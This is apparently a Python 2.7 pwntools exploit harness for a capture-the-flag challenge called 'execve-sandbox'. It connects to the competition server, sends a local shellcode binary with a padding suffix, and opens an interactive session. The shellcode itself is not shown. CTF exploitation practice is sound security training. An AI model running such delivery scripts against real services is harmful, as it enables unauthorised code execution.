#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None

    def start_binary(self):
        self.p = remote("execve-sandbox.ctfcompetition.com", 1337)
        print self.p.recvuntil("binary...\n")

    def pwn_binary(self):
        self.start_binary()

        with open("./shellcode", 'r') as elf_file:
            binary=elf_file.read()
        self.p.send(binary+"deadbeef")
        print self.p.recvuntil("sandbox\n")
        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
